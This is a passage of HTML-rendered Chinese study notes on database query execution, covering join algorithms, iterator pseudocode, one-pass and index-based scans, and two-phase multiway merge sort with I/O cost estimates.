xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>R</mi><mo>×</mo><mi>S</mi></mrow></msub><mo>=</mo><msub><mi>T</mi><mi>R</mi></msub><msub><mi>T</mi><mi>S</mi></msub><mo stretchy="false">(</mo><msub><mi>I</mi><mi>R</mi></msub><mo>+</mo><msub><mi>I</mi><mi>S</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">B_{R\times S}=T_RT_S(I_R+I_S)/b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">b</span></span></span></span></eq></p><h4 id="%EF%BC%883%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（3）连接操作的基本实现算法</h4><p>对于关系R，S的连接，一次分别将R和S的一个块从磁盘中移到内存中进行连接<br>复杂度 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub><mo>+</mo><msub><mi>B</mi><mi>R</mi></msub><mo>∗</mo><msub><mi>B</mi><mi>S</mi></msub></mrow><annotation encoding="application/x-tex">B_R+B_R*B_S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,但只需要内存三个块</p><h4 id="%EF%BC%884%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%A8%E4%B8%BB%E5%AD%98%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（4）连接操作的全主存实现算法</h4><p>将两个关系都撞入内存中进行连接，此时内存页数需要大于两个关系的内存块数。<br>复杂度<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub><mo>+</mo><msub><mi>B</mi><mi>S</mi></msub></mrow><annotation encoding="application/x-tex">B_R+B_S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></p><h4 id="%EF%BC%885%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8D%8A%E4%B8%BB%E5%AD%98%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（5）连接操作的半主存实现算法</h4><p>内存只能装入一个关系的所有块的条件下</p><p>先将一个装入内存，再将另一个关系的所有快一个个的放入内存进行连接</p><h4 id="%EF%BC%886%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%A4%A7%E5%85%B3%E7%B3%BB%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（6）连接操作的大关系实现算法</h4><p>此时内存不能装入任一关系的所有快。</p><p>此时先将内存装一个关系得所有快，每次装得只剩两个块得位置，装入多次，剩下两个一个用作输出，一个依次输入另一个关系得所有快，依次来进行连接操作</p><h4 id="%EF%BC%887%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95" tabindex="-1">（7）连接操作的其他方法</h4><ul><li>归并排序</li><li>散列排序</li><li>索引连接算法</li></ul><h3 id="1903-%E5%88%A9%E7%94%A8%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%9E%84%E9%80%A0%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">1903 利用迭代器构造查询实现算法</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%AE%97%E6%B3%95%E7%9A%84%E6%8F%90%E5%87%BA" tabindex="-1">（1）迭代器算法的提出</h4><ul><li>查询实现的两种策略<ul><li>物化计算策略：每一步将所有中间值得出再进行下一步</li><li>流水线计算策略，每得到的元组依次经过查询条件得到结果</li></ul></li><li>区别<ul><li>是一个关系操作还是一组关系操作</li><li>中间的结果是否完整的存储</li></ul></li></ul><p>迭代器算法在流水线计算策略中实现</p><h4 id="%EF%BC%882%EF%BC%89%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80" tabindex="-1">（2）迭代器算法基础</h4><p>迭代器：迭代的读取一个集合中的每一个元素，而封装其读取细节</p><p>有一个抽象类：</p><pre><code class="language-C++">class iterator&#123;  void Open();  tuple GetNext();  void Close();  iterator &amp;inputs[];&#125; </code></pre><p>所有的关系操作可继承此迭代器进行构造。<br>不同操作，可以构造不同的Open(),GetNext(),Close()函数</p><h4 id="%EF%BC%883%EF%BC%89%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%9A%84%E6%9E%84%E9%80%A0" tabindex="-1">（3）迭代器的构造</h4><p>迭代器示例：表空间扫描发–读取关系</p><pre><code class="language-C++">Open()&#123;  b:=R的第一块  t:=b的第一个元组&#125;GetNext()&#123;  IF(t已经超过块b的最后一个元组)&#123;    将b前进到下一块    IF(没有下一块)      return NotFound;    ELSE/*b是一个新块*/      t:=b的第一个元组  &#125;  oldt:=t  将t前进到b的下一元组  RETURN oldt;&#125;Close()&#123;&#125;</code></pre><p>迭代器示例：R并S算法</p><pre><code class="language-C++">Open()&#123;  R.Open();  CurRel:=R;&#125;GetNext()&#123;  IF(CurRel==R)&#123;    t:=R.GetNext();    IF(t&lt;&gt;NotFound)      RETURN t;    ELSE&#123;      s.Open();      curRel:=S;    &#125;  &#125;  RETURN S.GetNext();&#125;Close()&#123;R.close();S.close();&#125;</code></pre><h3 id="1904-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%B8%80%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95" tabindex="-1">1904 数据库查询的一趟扫描算法</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%B6%9F%E7%AE%97%E6%B3%95" tabindex="-1">（1）什么是一趟算法</h4><p>内存能放下关系的所有块，即只需要调用一次数据库的算法。</p><h4 id="%EF%BC%882%EF%BC%89%E5%85%B3%E7%B3%BB%2F%E8%A1%A8%E6%95%B0%E6%8D%AE%E7%9A%84%E8%AF%BB%E5%8F%96" tabindex="-1">（2）关系/表数据的读取</h4><h5 id="%E8%81%9A%E7%B0%87%E5%85%B3%E7%B3%BB" tabindex="-1">聚簇关系</h5><p>下文中B（R）是R的存储块的数目，T（R）是R的元组数目，M是内存能放下的块的数目</p><ul><li>关系的元组集中存放（一个块中仅是一个关系的元组）<ul><li>TableScan® 表空间扫描算法<br>扫描结构未排序：B（R）</li><li>SortTableScan®<br>扫描结构排序：3B（R）</li><li>IndexScan® 索引扫描算法<br>扫描结果未排序：B（R）</li><li>SortIndexScan®<br>扫描结果排序 B® or 3 B®</li></ul></li></ul><h5 id="%E9%9D%9E%E8%81%9A%E7%B0%87%E5%85%B3%E7%B3%BB" tabindex="-1">非聚簇关系</h5><ul><li><p>关系的元组不一定集中存放</p></li><li><p>扫描结果未排序：T®</p></li><li><p>扫描结果排序：T®+2B®</p></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%95%B4%E4%B8%AA%E5%85%B3%E7%B3%BB%E7%9A%84%E4%B8%80%E5%85%83%E6%93%8D%E4%BD%9C%E7%AE%97%E6%B3%95" tabindex="-1">（3）整个关系的一元操作算法</h4><ul><li><p>需要在内存中保存已经处理过的元组</p></li><li><p>当新元组到达时，需要和之前处理过的元组进行比较</p></li><li><p>建立不同的内存数据结构，来保存之前处理过的数据，以便快速处理整个关系上的操作</p></li><li><p>算法复杂性：B（R）</p></li><li><p>应用条件：B(&amp;R)&lt;=M</p></li><li><p>去重复 &amp;®，分组聚集<br>可以在内存中采取散列的数据结构，达到快速插入，快速定位的效果</p></li></ul><h4 id="%EF%BC%884%EF%BC%89%E6%95%B4%E4%B8%AA%E5%85%B3%E7%B3%BB%E7%9A%84%E4%BA%8C%E5%85%83%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（4）整个关系的二元操作实现算法</h4><ul><li>扫描一个关系，再扫描另一个关系</li><li>集合的操作需要去重；包的操作需要做计数</li><li>算法复杂度：B®+B(S)</li><li>应用条件:min(B®,B(S))&lt;=M</li></ul><h3 id="1905-%E5%9F%BA%E4%BA%8E%E7%B4%A2%E5%BC%95%E7%9A%84%E7%AE%97%E6%B3%95" tabindex="-1">1905 基于索引的算法</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E7%B4%A2%E5%BC%95%E7%9A%84%E9%80%89%E6%8B%A9%E7%AE%97%E6%B3%95" tabindex="-1">（1）基于索引的选择算法</h4><ul><li>选择条件中有涉及到索引属性时，可以使用索引，辅助快速索引</li><li>聚簇和非聚簇索引，使用时效率不一样</li><li>可能在多个属性上都存在索引</li></ul><p>索引应用分析示例：<br>假设B®=1000，T®=20000，即有20 000 个元组放到1000个块中。a是R的一个属性，在a上有一个索引，考虑 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>a</mi><mo>=</mo><mn>0</mn></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{a=0}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq>操作</p><ul><li>如果R是聚簇的，且不使用索引，查询代价1000I/O</li><li>如果R不是聚簇的，且不使用索引，查询代价20000</li><li>如果V(R,a)=100（表示a只有100个不同的大小）,且索引是聚簇的，查询代价 即a=0d的元组所在的总共的块数，平均1000/100=10。</li><li>如果V(R,a)=100且索引是非聚簇的，查询代价平均20000/100=200</li><li>如果V(R,a)=20000，即a是关键字，查询代价为1</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%9C%89%E5%BA%8F%E7%B4%A2%E5%BC%95%E7%9A%84%E8%BF%9E%E6%8E%A5%E7%AE%97%E6%B3%95%EF%BC%88zig-zag%E8%BF%9E%E6%8E%A5%E7%AE%97%E6%B3%95%EF%BC%89" tabindex="-1">（2）基于有序索引的连接算法（Zig-Zag连接算法）</h4><p>略难，跳，对应书P122</p><h3 id="1906-%E5%9B%9E%E9%A1%BE" tabindex="-1">1906 回顾</h3><ul><li><p>查询实现算法的基本思维</p></li><li><p>连接的逻辑实现算法</p></li><li><p>连接的物理实现算法</p><ul><li>如何降低磁盘I/O</li><li>充分利用内存，减少循环量</li><li>如何降低内存的查找量</li><li>建立合适的数据结构</li></ul></li><li><p>一趟算法：只要有一个关系能够全部装入内存即可实施<br>需要用一些算法</p><ul><li>迭代器算法</li><li>基于散列的算法</li><li>基于排序的算法</li><li>基于索引的算法</li></ul></li></ul><h3 id="2001-%E4%B8%A4%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">2001 两趟扫描算法的基本思想</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B4%E4%B8%AA%E5%85%B3%E7%B3%BB%E6%93%8D%E4%BD%9C%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">（1）整个关系操作存在的问题</h4><ul><li>对于一个关系，可能不能将整个关系都放入内存中，一趟算法已经不能实施</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%A4%E8%B6%9F%E7%AE%97%E6%B3%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF" tabindex="-1">（2）两趟算法的基本思路</h4><ul><li>第一趟：划分子集，使得子集具有某种特性，如有序或相同散列值</li><li>第二趟：处理全局性内容的操作，形成结果关系。如多子集间的归并排序，相同的散列值子集的操作等</li></ul><p>可实现原因：大数据集上的操作可以等价于子集上操作的并集</p><h3 id="2002-%E4%B8%A4%E9%98%B6%E6%AE%B5%E5%A4%9A%E8%B7%AF%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F" tabindex="-1">2002 两阶段多路归并排序</h3><h4 id="%EF%BC%881%EF%BC%89-%E5%86%85%E6%8E%92%E5%BA%8F%E5%92%8C%E5%A4%96%E6%8E%92%E5%BA%8F" tabindex="-1">（1） 内排序和外排序</h4><ul><li>内排序问题：待排序的数据可以一次性地装入内存中，即排序者可以完整地看到和操纵所有数据。内存中的排序算法：插入排序，冒牌排序</li><li>外排序问题：待排序的数据不能一次性地装入内存，即排序者不能一次完整地看到和操纵所有地数据，需要将数据分批次装入内存分批处理地排序问题。</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%A4%E9%98%B6%E6%AE%B5%E5%A4%9A%E8%B7%AF%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F" tabindex="-1">（2）两阶段多路归并排序</h4><p>全称TPMMS， Two-Phase Multi-way Merge Sort based join<br>两阶段多路归并排序是一种外排序。<br>现在假设内存大小x块，待排序数据要y块，y&gt;x。</p><ol><li>首先将要排序的数据划分为n份，x*n&gt;y</li><li>依次将分好的子集放入内存中进行内排序</li><li>随后将排序好的子集，对于所有的子集每次取一块放入内存中，将最小值或最大值取出后放入内存，原来的数据删除</li><li>内存中存在个子集中最小的元素，此时进行内排序，排序后的结果输入到新的外部存储中</li><li>重复4，5直至数据全部排序完</li></ol><p>算法效率：</p><ul><li><p>子集和排序阶段读一遍写一遍</p></li><li><p>归并阶段读一遍写一遍</p></li><li><p>总I/O次数4B®</p></li><li><p>算法应用条件：</p><ul><li>子集合数&lt;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{mermory}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>子集和块数&lt;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{mermory}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>大数据集块数&lt;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">B_{mermory}^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1972em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.453em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%9B%B4%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E5%A4%9A%E9%98%B6%E6%AE%B5%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95" tabindex="-1">（3）更大规模的多阶段归并算法</h4><ul><li>设内存大小 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow></msub><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">B_{mermory}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span></eq></li><li>待排序数据 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>p</mi><mi>r</mi><mi>o</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>m</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{problem}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">ro</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>=30$</li></ul><p>基本策略</p><ul><li>30块数据集-&gt;10个子集和，每个子集合3块，排序并存储</li><li>10个已经排序的子集合再分为5组进行二路归并排序，得到5个排序好的子集合</li><li>5个集合再分为3组，进行归并排序；最后得到3个排好序的子集和</li><li>再归并即可得到最终的排序</li></ul><h3 id="2003-%E5%9F%BA%E4%BA%8E%E6%8E%92%E5%BA%8F%E7%9A%84%E4%B8%A4%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95" tabindex="-1">2003 基于排序的两趟扫描算法</h3><h4 id="%EF%BC%881%EF%BC%89%E6%93%8D%E4%BD%9C" tabindex="-1">（1）操作</h4><p>去重复，聚集 复杂度等同TPMMS</p><ul><li>并<ul><li>包上直接合并即可，无需两趟</li><li>集合上需要两趟，需要去重<ul><li>效果同TPMMS</li></ul></li></ul></li><li>交，差<ul><li>包上和集合上都要两趟，需要处理出现次数或者去重复，效果同TPMMS</li></ul></li><li>连接运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mo>⋈</mo><mrow><mi>R</mi><mi mathvariant="normal">.</mi><mi>Y</mi><mo>=</mo><mi>S</mi><mi mathvariant="normal">.</mi><mi>Y</mi></mrow></msub><mi>S</mi></mrow><annotation encoding="application/x-tex">R\Join_{R.Y=S.Y} S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing 